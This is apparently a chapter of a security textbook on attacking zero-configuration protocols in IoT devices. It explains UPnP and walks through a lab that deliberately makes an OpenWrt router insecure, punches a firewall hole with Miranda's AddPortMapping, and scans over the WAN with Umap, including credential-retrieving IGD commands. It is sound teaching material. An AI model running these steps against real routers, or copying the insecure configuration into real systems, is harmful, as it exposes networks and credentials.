@@ -1,0 +1,666 @@
+<html><head></head><body><div id="sbo-rt-content"><section>
+<header>
+<h1 class="chapter">
+<span class="ChapterNumber"><span epub:type="pagebreak" title="117" id="Page_117"/>6</span><br/>
+<span class="ChapterTitle">Exploiting Zero-Configuration Networking</span>
+</h1>
+</header>
+<figure class="opener">
+<img src="Images/chapterart.png" alt="" width="204" height="204"/>
+</figure>
+<p class="ChapterIntro"><em>Zero-configuration networking</em> is a set of technologies that automate the processes of assigning network addresses, distributing and resolving hostnames, and discovering network services without the need for manual configuration or servers. These technologies are meant to  operate in the local network and usually assume that the participants in an environment have agreed to participate in the service, a fact that allows attackers on the network to easily exploit them. </p>
+<p>IoT systems regularly use zero-configuration protocols to give the devices access to the network without requiring the user to intervene. In this chapter, we explore common vulnerabilities found in three sets of zero-configuration protocols—Universal Plug and Play (UPnP), multicast Domain Name System (mDNS)/Domain Name System Service Discovery (DNS-SD), and Web Services Dynamic Discovery (WS-Discovery)—and discuss how to conduct attacks against IoT systems that rely on them. We’ll bypass a firewall, gain access to documents by pretending to be a network printer, fake traffic to resemble an IP camera, and more.</p>
+<h2 id="h1-500907c06-0001"><span epub:type="pagebreak" title="118" id="Page_118"/>Exploiting UPnP</h2>
+<p class="BodyFirst">The UPnP set of networking protocols automates the process of adding and configuring devices and systems on the network. A device that supports UPnP can dynamically join a network, advertise its name and capabilities, and discover other devices and their capabilities. People use UPnP applications to easily identify network printers, automate port mappings on home routers, and manage video streaming services, for example. </p>
+<p>But this automation comes at a price, as you’ll learn in this section. We’ll first provide an overview of UPnP and then set up a test UPnP server and exploit it to open holes in a firewall. We’ll also explain how other attacks against UPnP work and how to combine insecure UPnP implementations with other vulnerabilities to perform high-impact attacks.</p>
+<aside epub:type="sidebar">
+<div class="top hr"><hr/></div>
+<section class="box">
+<h2>A Brief History of UPnP Vulnerabilities</h2>
+<p class="BoxBodyFirst">UPnP has a long history of abuse. In 2001, attackers began performing buffer overflow and denial of service attacks against the UPnP implementation in the Windows XP stack. As many home modems and routers connected to the telecommunication carrier’s network started using UPnP during the 2000s, Armijn Hemel of <em>upnp-hacks.org</em> began reporting on vulnerabilities in many such stacks. Then, in 2008, the security organization GNUcitizen discovered an innovative way of abusing a flaw in the Internet Explorer Adobe Flash plug-in (<a href="https://www.gnucitizen.org/blog/hacking-the-interwebs/" class="LinkURL">https://www.gnucitizen.org/blog/hacking-the-interwebs/</a>) to execute a port-forwarding attack in UPnP-enabled devices belonging to users who visited malicious web pages. In 2011, at Defcon 19, Daniel Garcia presented a new tool called Umap (<a href="https://toor.do/DEFCON-19-Garcia-UPnP-Mapping-WP.pdf" class="LinkURL">https://toor.do/DEFCON-19-Garcia-UPnP-Mapping-WP.pdf</a>) that could exploit UPnP devices from the WAN by requesting port mappings through the internet. (We’ll use Umap in this chapter.) In 2012, HD Moore scanned the entire internet for UPnP flaws and, in 2013, published a whitepaper with some alarming results: Moore had found 81 million devices that exposed their services to the public internet, along with various exploitable vulnerabilities in two popular UPnP stacks (<a href="https://information.rapid7.com/rs/411-NAK-970/images/SecurityFlawsUPnP%20%281%29.pdf" class="LinkURL">https://information.rapid7.com/rs/411-NAK-970/images/SecurityFlawsUPnP%20%281%29.pdf</a>).Akamai followed this up in 2017 by identifying 73 different manufacturers suffering from a similar vulnerability <em>(</em><a href="https://www.akamai.com/cn/zh/multimedia/documents/white-paper/upnproxy-blackhat-proxies-via-nat-injections-white-paper.pdf" class="LinkURL">https://www.akamai.com/cn/zh/multimedia/documents/white-paper/upnproxy-blackhat-proxies-via-nat-injections-white-paper.pdf</a>). These manufacturers publicly exposed UPnP services that could lead to Network address translation (NAT) injections, which attackers could use to either create a proxy network or expose machines behind the LAN (an attack called UPnProxy). </p>
+<p>And these are only the highlights of UPnP’s history of insecurity. </p>
+<div class="bottom hr"><hr/></div>
+</section>
+</aside>
+<h3 id="h2-500907c06-0001"><span epub:type="pagebreak" title="119" id="Page_119"/>The UPnP Stack</h3>
+<p class="BodyFirst">The UPnP stack consists of six layers: addressing, discovery, description, control, eventing, and presentation.</p>
+<p>In the <em>addressing</em> layer, UPnP-enabled systems try to get an IP address through DHCP. If that isn’t possible, they’ll self-assign an address from the 169.254.0.0/16 range (RFC 3927), a process known as <em>AutoIP</em>.</p>
+<p>Next is the <em>discovery</em> layer, in which the system searches for other devices on the network using the Simple Service Discovery Protocol (SSDP). The two ways to discover devices are actively and passively. When using the active method, UPnP-capable devices send a discovery message (called an <em>M-SEARCH request</em>) to the multicast address 239.255.255.250 on UDP port 1900. We call this request HTTPU (HTTP over UDP) because it contains a header similar to the HTTP header. The M-SEARCH request looks like this:</p>
+<pre><code>M-SEARCH * HTTP/1.1 
+ST: ssdp:all 
+MX: 5 
+MAN: ssdp:discover 
+HOST: 239.255.255.250:1900</code></pre>
+<p>UPnP systems that listen for this request are expected to reply with a UDP unicast message that announces the HTTP location of the <em>description </em>XML file, which lists the device’s supported services. (In Chapter 4, we demonstrated connecting to the custom network service of an IP webcam, which returned information similar to what would typically be in this kind of description XML file, suggesting the device might be UPnP capable.)</p>
+<p>When using the passive method for discovering devices, UPnP-capable devices periodically announce their services on the network by sending a NOTIFY message to the multicast address 239.255.255.250 on UDP port 1900. This message, which follows, looks like the one sent as a response to the active discovery:</p>
+<pre><code>NOTIFY * HTTP/1.1\r\n
+HOST: 239.255.255.250:1900\r\n
+CACHE-CONTROL: max-age=60\r\n
+LOCATION: http://192.168.10.254:5000/rootDesc.xml\r\n
+SERVER: OpenWRT/18.06-SNAPSHOT UPnP/1.1 MiniUPnPd/2.1\r\n
+NT: urn:schemas-upnp-org:service:WANIPConnection:2\r\n</code></pre>
+<p>Any interested participant on the network can listen to these discovery messages and send a description query message. In the <em>description </em>layer, UPnP participants learn more about the device, its capabilities, and how to interact with it. The description of every UPnP profile is referenced in either the LOCATION field value of the response message received during active discovery or the NOTIFY message received during passive discovery. <span epub:type="pagebreak" title="120" id="Page_120"/>The LOCATION field contains a URL that points to a <em>description XML file</em> consisting of the URLs used during the control and eventing phases (described next). </p>
+<p>The <em>control</em> layer is probably the most important one; it allows clients to send commands to the UPnP device using the URLs from the description file. They can do this using the <em>Simple Object Access Protocol </em>(<em>SOAP</em>)<em>, </em>a messaging protocol that uses XML over HTTP. Devices send SOAP requests to the <code>controlURL</code> endpoint, described in the <code>&lt;service&gt;</code> tag inside the description file. A <code>&lt;service&gt;</code> tag looks like this:</p>
+<pre><code>&lt;service&gt;
+  &lt;serviceType&gt;urn:schemas-upnp-org:service:WANIPConnection:2&lt;/serviceType&gt;
+&lt;serviceId&gt;urn:upnp-org:serviceId:WANIPConn1&lt;/serviceId&gt;
+&lt;SCPDURL&gt;/WANIPCn.xml&lt;/SCPDURL&gt;
+<span class="CodeAnnotationHang">1</span> &lt;controlURL&gt;/ctl/IPConn&lt;/controlURL&gt;
+<span class="CodeAnnotationHang">2</span> &lt;eventSubURL&gt;/evt/IPConn&lt;/eventSubURL&gt;
+&lt;/service&gt;</code></pre>
+<p>You can see the <code>controlURL</code><span class="CodeAnnotation">1</span>. The <em>eventing</em> layer notifies clients that have subscribed to a specific <code>eventURL </code><span class="CodeAnnotation">2</span>, also described in the <code>service</code> tag inside the description XML file. These event URLs are associated with specific state variables (also included in the description XML file) that model the state of the service at runtime. We won’t use state variables in this section.</p>
+<p>The <em>presentation</em> layer exposes an HTML-based user interface for controlling the device and viewing its status—for example, the web interface of a UPnP-capable camera or router.</p>
+<h3 id="h2-500907c06-0002">Common UPnP Vulnerabilities</h3>
+<p class="BodyFirst">UPnP has a long history of buggy implementations and flaws. First of all, because UPnP was designed to be used inside LANs, there is no authentication on the protocol, which means that anyone on the network can abuse it. </p>
+<p>UPnP stacks are known for poorly validating input, which leads to flaws such as the unvalidated <code>NewInternalClient</code> bug. This bug allows you to use any kind of IP address, whether internal or external, for the <code>NewInternalClient</code> field in the device’s port-forwarding rules. This means that an attacker could turn a vulnerable router into a proxy. For example, imagine you add a port-forwarding rule that sets <code>NewInternalClient</code> to the IP address of <em>sock-raw.org</em>, <code>NewInternalPort </code>to TCP port 80, and <code>NewExternalPort </code>to 6666. Then, by probing the router’s external IP on port 6666, you’d make the router probe the web server on <em>sock-raw.org</em> without your IP address showing in the target’s logs. We’ll walk through a variation of this attack in the next section.</p>
+<p>On the same note, UPnP stacks sometimes contain memory corruption bugs, which can lead to remote denial of service attacks in the best-case scenario and remote code execution in the worst-case one. For instance, attackers have discovered devices that use SQL queries to update their in-memory rules while externally accepting new rules through UPnP, making them susceptible to SQL injection attacks. Also, because UPnP relies on XML, weakly <span epub:type="pagebreak" title="121" id="Page_121"/>configured XML-parsing engines can fall victim to <em>External Entity</em> (<em>XXE</em>) <em>attacks</em>. In these attacks, the engine processes potentially malicious input containing references to an external entity, disclosing sensitive information or causing other impacts to the system. To make matters worse, the specification discourages, but doesn’t outright ban, UPnP on internet-facing WAN interfaces. Even if some vendors follow the recommendation, bugs in the implementation often allow WAN requests to go through. </p>
+<p>Last but not least, devices often don’t log UPnP requests, which means the user has no way of knowing if an attacker is actively abusing it. Even if the device supports UPnP logging, the log is typically stored client side on the device and doesn’t have configurable options through its user interface. </p>
+<h3 id="h2-500907c06-0003">Punching Holes Through Firewalls</h3>
+<p class="BodyFirst">Let’s perform what is perhaps the most common attack against UPnP: punching unsolicited holes through firewalls. In other words, this attack will add or modify a rule in the firewall configuration that exposes an otherwise protected network service. By doing so, we’ll walk through the different UPnP layers and gain a better understanding of how the protocol works.</p>
+<h4 id="h3-500907c06-0001">How the Attack Works </h4>
+<p class="BodyFirst">This firewall attack relies on the inherent permissiveness of the <em>Internet Gateway Device </em>(<em>IGD</em>) protocol implemented via UPnP. IGD maps ports in <em>network address translation</em> (<em>NAT</em>) setups.</p>
+<p>Almost every home router uses NAT, a system that allows multiple devices to share the same external IP address by remapping the IP address to a private network address. The external IP is typically the public address your internet service provider assigns to your modem or router. The private IP addresses can be any of the standard RFC 1918 range: 10.0.0.0–10.255.255.255 (class A), 172.16.0.0–172.31.255.255 (class B), or 192.168.0.0–192.168.255.255 (class C). </p>
+<p>Although NAT is convenient for home solutions and conserves IPv4 address space, it does have some flexibility problems. For example, what happens when applications, such as BitTorrent clients, need other systems to connect to them on a specific public port but are behind a NAT device? Unless that port is exposed on the device’s internet-facing network, no peer can connect. One solution is to have the user manually configure port forwarding on their router. But that would be inconvenient, especially if the port had to change for every connection. Also, if the port was statically configured in the router’s port-forwarding settings, any other application that needed to use that specific port couldn’t. The reason is that external port mapping would already be associated with a specific internal port and IP address and, therefore, would have to be reconfigured for every connection. </p>
+<p>This is where IGD comes to the rescue. IGD allows an application to dynamically add a temporary port mapping on the router for a certain time period. It solves both problems: users don’t need to manually configure port forwarding, and it allows the port to change for every connection. </p>
+<p><span epub:type="pagebreak" title="122" id="Page_122"/>But attackers can abuse IGD in insecurely configured UPnP setups. Normally, systems behind the NAT device should be able to perform port forwarding on their own ports only. The problem is that many IoT devices, even nowadays, allow anyone on the network to add port mappings for other systems. This allows attackers on the network to do malicious things, such as exposing the administration interface of a router to the internet. </p>
+<h4 id="h3-500907c06-0002">Setting Up a Test UPnP Server</h4>
+<p class="BodyFirst">We’ll start by setting up MiniUPnP, a lightweight implementation of a UPnP IGD server, on an OpenWrt image so we have a UPnP server to attack. OpenWrt is an open source, Linux-based operating system targeting embedded devices and is primarily used for network routers. You can skip this setup section if you download the vulnerable OpenWrt VM from <a href="https://nostarch.com/practical-iot-hacking/" class="LinkURL">https://nostarch.com/practical-iot-hacking/</a>. </p>
+<p>Walking through the OpenWrt setup is beyond the scope of this book, but you can find a guide for its setup at <a href="https://openwrt.org/docs/guide-user/virtualization/vmware" class="LinkURL">https://openwrt.org/docs/guide-user/virtualization/vmware</a>. Convert a snapshot of OpenWrt/18.06 to a VMware-compatible image and run it using the VMware workstation or player on a local lab network. You can find the x86 snapshot we used for OpenWrt version 18.06 at <a href="https://downloads.openwrt.org/releases/18.06.4/targets/x86/generic/openwrt-18.06.4-x86-generic-combined-ext4.img.gz" class="LinkURL">https://downloads.openwrt.org/releases/18.06.4/targets/x86/generic/openwrt-18.06.4-x86-generic-combined-ext4.img.gz</a><em>.</em></p>
+<p>Next, set up your network configuration, which is particularly important to clearly demonstrate the attack. We configured two network adapters in the virtual machine’s settings:</p>
+<ul>
+<li>One that is bridged on the local network and corresponds to eth0 (the LAN interface). In our case, we statically configured it to have the IP address 192.168.10.254 corresponding to our local network lab. We configured the IP address by manually editing the <em>/etc/network/config</em> file of our OpenWrt VM. Adjust this to reflect your local network configuration. </li>
+<li>One that is configured as VMware’s NAT interface and corresponds to eth1 (the WAN interface). It was automatically assigned the IP address 192.168.92.148 through DHCP. This one emulates the external, or PPP, interface of the router that would be connected to the internet service provider and have a public IP address.</li>
+</ul>
+<p>If you haven’t worked with VMware before, the guide at <a href="https://www.vmware.com/support/ws45/doc/network_configure_ws.html" class="LinkURL">https://www.vmware.com/support/ws45/doc/network_configure_ws.html</a><em> </em>can help you set up additional network interfaces for your virtual machine. Although it mentions version 4.5, the instructions are applicable for every modern VMware implementation. If you’re using<em> </em>VMware Fusion on macOS, the guide at <a href="https://docs.vmware.com/en/VMware-Fusion/12/com.vmware.fusion.using.doc/GUID-E498672E-19DD-40DF-92D3-FC0078947958.html" class="LinkURL">https://docs.vmware.com/en/VMware-Fusion/12/com.vmware.fusion.using.doc/GUID-E498672E-19DD-40DF-92D3-FC0078947958.html</a> can help you. In either case, add a second network adapter and change its settings to NAT (called “Share with My Mac” on Fusion), and then modify the first network adapter to be Bridged (called “Bridged Networking” on Fusion).</p>
+<p><span epub:type="pagebreak" title="123" id="Page_123"/>You might want to configure the VMware settings so the bridged mode applies only to the adapter that is actually connected to your local network. Because you have two adapters, VMware’s auto-bridge feature might try to bridge with the one that isn’t connected. It’s typical to have one Ethernet and one Wi-Fi adapter, so make sure you check which one is connected to which network.</p>
+<p>Now the network interfaces part of the OpenWrt VM’s <em>/etc/config/network</em> file should look something like this:</p>
+<pre><code>config interface 'lan'
+        option ifname 'eth0'
+        option proto 'static'
+        option ipaddr '192.168.10.254'
+        option netmask '255.255.255.0'
+        option ip6assign '60'
+        option gateway '192.168.10.1'
+
+config interface 'wan'
+        option ifname 'eth1'
+        option proto 'dhcp'
+
+config interface 'wan6'
+        option ifname 'eth1'
+        option proto 'dhcpv6'</code></pre>
+<p>Make sure your OpenWrt has internet connectivity, and then enter the following command in your shell to install the MiniUPnP server and <em>luci-app-upnp</em>. The <code>luci-app-upnp</code> package lets you configure and display UPnP settings through Luci, the default web interface for OpenWrt:</p>
+<pre><code># <b>opkg update &amp;&amp; opkg install miniupnpd luci-app-upnp</b></code></pre>
+<p>We then need to configure MiniUPnPd. Enter the following command to edit the file with Vim (or use the text editor of your choice):</p>
+<pre><code># <b>vim /etc/init.d/miniupnpd</b></code></pre>
+<p>Scroll down to where the file mentions <code>config_load "upnpd"</code> for the second time (in MiniUPnP version 2.1-1, this is at line 134.) Change the settings as follows:</p>
+<pre><code>config_load "upnpd"
+upnpd_write_bool enable_natpmp 1
+upnpd_write_bool enable_upnp 1
+upnpd_write_bool secure_mode 0</code></pre>
+<p>The most important change is to disable <code>secure_mode</code><em>. </em>Disabling this setting allows clients to redirect incoming ports to IP addresses other than themselves. This setting is enabled by default, which means the server would forbid an attacker from adding port mappings that would redirect to any other IP address. </p>
+<p><span epub:type="pagebreak" title="124" id="Page_124"/>The <code>config_load "upnpd"</code> command also loads additional settings from the <em>/etc/config/upnpd</em> file, which you should change to look as follows:</p>
+<pre><code>config upnpd 'config'
+        option download '1024'
+        option upload '512'
+        option internal_iface 'lan'
+        option external_iface 'wan' <span class="CodeAnnotation">1</span>
+        option port '5000'
+        option upnp_lease_file '/var/run/miniupnpd.leases'
+        option enabled '1' <span class="CodeAnnotation">2</span>
+        option uuid '125c09ed-65b0-425f-a263-d96199238a10'
+        option secure_mode '0'
+        option log_output '1'
+
+config perm_rule
+        option action 'allow'
+        option ext_ports '1024-65535'
+        option int_addr '0.0.0.0/0'
+        option int_ports '0-65535'<span class="CodeAnnotation">3</span>
+        option comment 'Allow all ports'</code></pre>
+<p>First, you have to manually add the external interface option <span class="CodeAnnotation">1</span>; otherwise, the server won’t allow port redirection to the WAN interface. Second, enable the <em>init</em> script to launch MiniUPnP <span class="CodeAnnotation">2</span>. Third, allow redirections to all internal ports <span class="CodeAnnotation">3</span>, starting from 0. By default, MiniUPnPd allows redirections to certain ports only. We deleted all other <em>perm_rules. </em>If you copy the <em>/etc/config/upnpd</em><em> </em>file as shown here, you should be good to go.</p>
+<p>After completing the changes, restart the MiniUPnP daemon using the following command:</p>
+<pre><code># <b>/etc/init.d/miniupnpd restart</b></code></pre>
+<p>You’ll also have to restart the OpenWrt firewall after restarting the server. The firewall is part of the Linux operating system, and OpenWrt comes with it enabled by default. You can easily do so by browsing to the web interface at <a href="http://192.168.10.254/cgi-bin/luci/admin/status/iptables/%20" class="LinkURL">http://192.168.10.254/cgi-bin/luci/admin/status/iptables/ </a>and clicking <b>Restart Firewall</b>, or by entering the following command in a terminal:</p>
+<pre><code># <b>/etc/init.d/firewall restart</b></code></pre>
+<p>Current versions of OpenWrt are more secure, and we’re deliberately making this server insecure for the purposes of this exercise. Nevertheless, countless available IoT products are configured like this by default.</p>
+<h4 id="h3-500907c06-0003">Punching Holes in the Firewall</h4>
+<p class="BodyFirst">With our test environment set up, let’s try the firewall hole-punching attack by abusing IGD. We’ll use IGD’s <code>WANIPConnection</code> subprofile, which supports the <code>AddPortMapping </code>and <code>DeletePortMapping</code> actions for adding and removing <span epub:type="pagebreak" title="125" id="Page_125"/>port mappings, correspondingly. We’ll use the <code>AddPortMapping</code> command with the UPnP testing tool Miranda, which is preinstalled on Kali Linux. If you don't have Miranda preinstalled, you can always get it from <a href="https://github.com/0x90/miranda-upnp/" class="LinkURL">https://github.com/0x90/miranda-upnp/</a>—note that you'll need Python 2 to run it. <a id="listinganchor6-1" href="#listing6-1">Listing 6-1</a> uses Miranda to punch a hole through the firewall on the vulnerable OpenWrt router. </p>
+<pre><code># <b>miranda</b>
+upnp&gt; <b>msearch</b>
+upnp&gt; <b>host list</b> 
+upnp&gt; <b>host get 0</b>
+upnp&gt; <b>host details 0</b> 
+upnp&gt; <b>host send 0 WANConnectionDevice WANIPConnection AddPortMapping</b>
+       Set NewPortMappingDescription value to: <b>test</b>
+       Set NewLeaseDuration value to: <b>0</b>
+       Set NewInternalClient value to: <b>192.168.10.254</b>
+       Set NewEnabled value to: <b>1</b>
+       Set NewExternalPort value to: <b>5555</b>
+       Set NewRemoteHost value to: 
+       Set NewProtocol value to: <b>TCP</b>
+       Set NewInternalPort value to: <b>80</b></code></pre>
+<p class="CodeListingCaption"><a id="listing6-1">Listing 6-1:</a> Punching a hole in the OpenWrt router with Miranda</p>
+<p>The <code>msearch</code> command sends an M-SEARCH * packet to the multicast address 239.255.255.250 on UDP port 1900, completing the active discovery stage, as described in “The UPnP Stack” on page 119. You can press <span class="KeyCaps">CTRL</span>-C at any time to stop waiting for more replies, and you should do so when your target responds. </p>
+<p>The host 192.168.10.254 should now appear on the <code>host list</code>, a list of targets the tool keeps track of internally, along with an associated index. Pass the index as an argument to the <code>host get</code> command to fetch the <em>rootDesc.xml</em> description file. Once you do so, <code>host details</code> should display all supported IGD profiles and subprofiles. In this case, <code>WANIPConnection</code> under <code>WANConnectionDevice</code> should show up for our target.</p>
+<p>Finally, we send the <code>AddPortMapping </code>command to the host to redirect the external port 5555 (randomly chosen) to the web server’s internal port, exposing the web administration interface to the internet. When we enter the command, we have to then specify its arguments. The <code>NewPortMappingDescription</code> is any string value, and it’s normally displayed in the router’s UPnP settings for the mapping. The <code>NewLeaseDuration</code> sets how long the port mapping will be active. The value <code>0</code>, shown here, means unlimited time. The <code>NewEnabled</code> argument can be <code>0</code> (meaning inactive) or <code>1</code> (meaning active). The <code>NewInternalClient</code> refers to the IP address of the internal host that the mapping is associated with. The <code>NewRemoteHost </code>is usually empty. Otherwise, it would restrict the port mapping to only that particular external host. The <code>NewProtocol</code> can be TCP or UDP. The <code>NewInternalValue</code> is the port of the <code>NewInternalClient </code>host that the traffic coming on the <code>NewExternalPort </code>will be forwarded to. </p>
+<p>We should now be able to see the new port mapping by visiting the web interface for the OpenWrt router at <em>192.168.10.254/cgi/bin/luci/admin/services/upnp</em> (<a id="figureanchor6-1" href="#figure6-1">Figure 6-1</a>).</p>
+<span epub:type="pagebreak" title="126" id="Page_126"/><figure>
+<img src="Images/f06001.png" alt="f06001" width="750" height="228"/>
+<figcaption><p><a id="figure6-1">Figure 6-1:</a> We should see the new port mapping in the Luci interface.</p></figcaption>
+</figure>
+<p>To test whether our attack was successful, let’s visit our router’s external IP address 192.168.92.148 on the forwarded port 5555. Remember that the private web interface shouldn’t normally be accessible through the public-facing interface. <a id="figureanchor6-2" href="#figure6-2">Figure 6-2</a> shows the result. </p>
+<figure>
+<img src="Images/f06002.png" alt="f06002" width="750" height="246"/>
+<figcaption><p><a id="figure6-2">Figure 6-2:</a> The accessible web interface</p></figcaption>
+</figure>
+<p>After we sent the <code>AddPortMapping</code> command, the private web interface became accessible through the external interface on port 5555.</p>
+<h3 id="h2-500907c06-0004">Abusing UPnP Through WAN interfaces</h3>
+<p class="BodyFirst">Next, let’s abuse UPnP remotely through the WAN interface. This tactic could allow an external attacker to do some damage, such as forward ports from hosts inside the LAN or execute other useful IGD commands, like the self-explanatory <code>GetPassword</code> or <code>GetUserName</code>. You can perform this attack in buggy or insecurely configured UPnP implementations. </p>
+<p>To perform this attack, we’ll use Umap, a tool written specifically for this purpose.</p>
+<h4 id="h3-500907c06-0004">How the Attack Works</h4>
+<p class="BodyFirst">As a security precaution, most devices don’t normally accept SSDP packets through the WAN interface, but some of them can still accept IGD commands through open SOAP control points. This means that an attacker can interact with them directly from the internet.  </p>
+<p>For that reason, Umap skips the discovery phase of the UPnP stack (the phase in which a device uses SSDP to discover other devices on the <span epub:type="pagebreak" title="127" id="Page_127"/>network) and tries to directly scan for the XML description files. If it finds one, it then moves on to UPnP’s control step and tries to interact with the device by sending it SOAP requests directed at the URL in the description file. </p>
+<p><a id="figureanchor6-3" href="#figure6-3">Figure 6-3</a> shows the flow diagram for Umap’s scan of internal networks.</p>
+<figure>
+<img src="Images/f06003.png" alt="f06003" width="750" height="533"/>
+<figcaption><p><a id="figure6-3">Figure 6-3:</a> The Umap flow diagram for scanning hosts</p></figcaption>
+</figure>
+<p>Umap first tries to scan for IGD control points by testing a variety of known XML file locations (such as <em>/rootDesc.xml</em> or <em>/upnp/IGD.xml</em>). After it finds one successfully, Umap tries to guess the internal LAN IP block. Remember that you’re scanning the external (internet-facing) IP address, so the IP addresses behind the NAT device will be different. </p>
+<p>Next, Umap sends an IGD port-mapping command for each common port, forwarding that port to the WAN. Then it tries to connect to that port. If the port is closed, it sends an IGD command to delete the port mapping. Otherwise, it reports that the port is open and leaves the port mapping as-is. By default, it scans the following common ports (hardcoded in the <code>commonPorts</code> variable in <em>umap.py</em>):</p>
+<pre><code>commonPorts = ['21','22','23','80','137','138','139','443','445','3389', '8080']</code></pre>
+<p><span epub:type="pagebreak" title="128" id="Page_128"/>Of course, you can edit the <code>commonPorts</code> variable and try to forward other ports. You can find a good reference for the most commonly used TCP ports by running the following Nmap command: </p>
+<pre><code># <b>nmap --top-ports 100 -v -oG –</b>
+Nmap 7.70 scan initiated Mon Jul  8 00:36:12 2019 as: nmap --top-ports 100 -v -oG -
+# Ports scanned: TCP(100;7,9,13,21-23,25-26,37,53,79-81,88,106,110-111,113,119,135,139,143-144,179,199,389,427,443-445,465,513-515,543-544,548,554,587,631,646,873,990,993,995,1025-1029,1110,1433,1720,1723,1755,1900,2000-2001,2049,2121,2717,3000,3128,3306,3389,3986,4899,5000,5009,5051,5060,5101,5190,5357,5432,5631,5666,5800,5900,6000-6001,6646,7070,8000,8008-8009,8080-8081,8443,8888,9100,9999-10000,32768,49152-49157) UDP(0;) SCTP(0;) PROTOCOLS(0;)</code></pre>
+<h4 id="h3-500907c06-0005">Getting and Using Umap </h4>
+<p class="BodyFirst">Umap was first released at Defcon 19 by Daniel Garcia; you can find the latest version of it on the tool author’s website at <a href="https://toor.do/umap-0.8.tar.gz" class="LinkURL">https://toor.do/umap-0.8.tar.gz</a>. After extracting the compressed tarball Umap, you might also need to install SOAPpy and iplib:</p>
+<pre><code># <b>apt-get install pip</b>
+# <b>pip install SOAPpy</b>
+# <b>pip install iplib</b></code></pre>
+<p>Umap is written in Python 2, which is no longer officially maintained; so if your Linux distribution doesn’t have the Python 2 <code>pip</code> package manager available, you’ll need to download it manually from <a href="https://pypi.org/project/pip/#files" class="LinkURL">https://pypi.org/project/pip/#files</a>. Download the latest version of the source and run it like this:</p>
+<pre><code># <b>tar -xzf pip-20.0.2.tar.gz</b>
+# <b>cd pip-20.0.2</b>
+# <b>python2.7 setup install</b></code></pre>
+<p>Run Umap with the following command (replacing the IP address with your target’s external IP address):</p>
+<pre><code># <b>./umap.py -c -i 74.207.225.18</b></code></pre>
+<p>Once you run it, Umap will go through the flow diagram shown in <a href="#figure6-3">Figure 6-3</a>. Even if the device doesn’t advertise an IGD command (meaning that the command might not be necessarily listed as <code>controlURL</code> in the <em>description </em>XML file), some systems still accept the commands because of buggy UPnP implementations. So, you should always try all of them in a proper security test. <a href="#table6-1" id="tableanchor6-1"/> contains a list of IGD commands to test.</p>
+<figure>
+<figcaption class="TableTitle"><p><a id="table6-1">Table 6-1</a>: A List of Possible IGD Commands</p></figcaption>
+<table id="table-500907c06-0001" border="1">
+<tbody>
+<tr>
+<td><code>SetConnectionType</code></td><td>Sets up a specific connection type.</td></tr>
+<tr>
+<td><code>GetConnectionTypeInfo</code></td><td>Retrieves the values of the current connection type and allowable connection types.</td></tr>
+<tr>
+<td><code>ConfigureConnection</code></td><td>Send this command to configure a PPP connection on the WAN device and change <code>ConnectionStatus</code> to <code>Disconnected</code> from <code>Unconfigured</code>.</td></tr>
+<tr>
+<td><code>RequestConnection</code></td><td>Initiates a connection on an instance of a connection service that has a configuration already defined.</td></tr>
+<tr>
+<td><code>RequestTermination</code></td><td>Send this command to any connection instance in <code>Connected</code>, <code>Connecting</code>, or <code>Authenticating</code> state to change <code>ConnectionStatus</code> to <code>Disconnected</code>.</td></tr>
+<tr>
+<td><code>ForceTermination</code></td><td>Send this command to any connection instance in <code>Connected</code>, <code>Connecting</code>, <code>Authenticating</code>, <code>PendingDisconnect</code>, or <code>Disconnecting</code> state to change <code>ConnectionStatus</code> to <code>Disconnected</code>.</td></tr>
+<tr>
+<td><code>SetAutoDisconnectTime</code></td><td>Sets the time (in seconds) after which an active connection is automatically disconnected.</td></tr>
+<tr>
+<td><code>SetIdleDisconnectTime</code></td><td>Specifies the idle time (in seconds) after which a connection can be disconnected.</td></tr>
+<tr>
+<td><code>SetWarnDisconnectDelay</code></td><td>Specifies the number of seconds of warning to each (potentially) active user of a connection before a connection is terminated.</td></tr>
+<tr>
+<td><code>GetStatusInfo</code></td><td>Retrieves the values of state variables pertaining to connection status.</td></tr>
+<tr>
+<td><code>GetLinkLayerMaxBitRates</code></td><td>Retrieves the maximum upstream and downstream bit rates for the connection.</td></tr>
+<tr>
+<td><code>GetPPPEncryptionProtocol</code></td><td>Retrieves the link layer (PPP) encryption protocol. </td></tr>
+<tr>
+<td><code>GetPPPCompressionProtocol</code></td><td>Retrieves the link layer (PPP) compression protocol. </td></tr>
+<tr>
+<td><code>GetPPPAuthenticationProtocol</code></td><td>Retrieves the link layer (PPP) authentication protocol.</td></tr>
+<tr>
+<td><code>GetUserName</code></td><td>Retrieves the username used for the activation of a connection.</td></tr>
+<tr>
+<td><code>GetPassword</code></td><td>Retrieves the password used for the activation of a connection.</td></tr>
+<tr>
+<td><code>GetAutoDisconnectTime</code></td><td>Retrieves the time (in seconds) after which an active connection is automatically disconnected.</td></tr>
+<tr>
+<td><code>GetIdleDisconnectTime</code></td><td>Retrieves the idle time (in seconds) after which a connection can be disconnected.</td></tr>
+<tr>
+<td><code>GetWarnDisconnectDelay</code></td><td>Retrieves the number of seconds of warning to each (potentially) active user of a connection before a connection is terminated.</td></tr>
+<tr>
+<td><code>GetNATRSIPStatus</code></td><td>Retrieves the current state of NAT and Realm-Specific IP (RSIP) on the gateway for this connection.</td></tr>
+<tr>
+<td><code>GetGenericPortMappingEntry</code></td><td>Retrieves NAT port mappings one entry at a time.</td></tr>
+<tr>
+<td><code>GetSpecificPortMappingEntry</code></td><td>Reports the Static Port Mapping specified by the unique tuple of <code>RemoteHost</code>, <code>ExternalPort</code>, and <code>PortMappingProtocol</code>.</td></tr>
+<tr>
+<td><code>AddPortMapping</code></td><td>Creates a new port mapping or overwrites an existing mapping with the same internal client. If the <code>ExternalPort</code> and <code>PortMappingProtocol</code> pair is already mapped to another internal client, an error is returned.</td></tr>
+<tr>
+<td><code>DeletePortMapping</code></td><td>Deletes a previously instantiated port mapping. As each entry is deleted, the array is compacted, and the evented variable <code>PortMappingNumberOfEntries</code> is decremented.</td></tr>
+<tr>
+<td><code>GetExternalIPAddress</code></td>
+<td>Retrieves the value of the external IP address on this connection instance.</td></tr>
+</tbody>
+</table>
+</figure>
+<p>Note that the latest public version (0.8) of Umap doesn’t automatically test these commands. You can find more detailed information about them at the official specification at <a href="http://upnp.org/specs/gw/UPnP-gw-WANPPPConnection-v1-Service.pdf/" class="LinkURL">http://upnp.org/specs/gw/UPnP-gw-WANPPPConnection-v1-Service.pdf/</a>.</p>
+<p>After Umap identifies an internet-exposed IGD, you can use Miranda to manually test these commands. Depending on the command, you should get various replies. For example, going back to our vulnerable OpenWrt router and running Miranda against it, we can see the output of some of these commands: </p>
